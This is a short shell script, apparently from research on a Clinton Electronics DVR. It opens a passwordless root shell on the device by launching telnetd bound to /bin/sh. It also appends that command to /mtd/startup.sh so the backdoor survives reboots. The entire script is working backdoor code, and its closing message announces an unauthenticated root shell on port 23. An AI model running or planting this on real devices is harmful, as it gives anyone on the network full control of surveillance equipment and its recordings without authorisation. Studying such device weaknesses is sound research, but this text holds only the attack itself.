#!/bin/sh
#
# telnet_enable.sh - Enable Telnet on Clinton Electronics DVR
#
# This script illustrates how root access is activated on the device.
# Once executed on the DVR, telnetd starts in the background and
# /mtd/startup.sh ensures persistence across reboots.
#

# 1. Spawn telnet daemon with /bin/sh shell
/usr/sbin/telnetd -l /bin/sh &

# 2. Add to /mtd/startup.sh if not already present
if ! grep -q "telnetd" /mtd/startup.sh 2>/dev/null; then
    echo "/usr/sbin/telnetd -l /bin/sh &" >> /mtd/startup.sh
    chmod +x /mtd/startup.sh
fi

echo "[+] Telnet enabled on port 23 (root shell with no password required on LAN)"
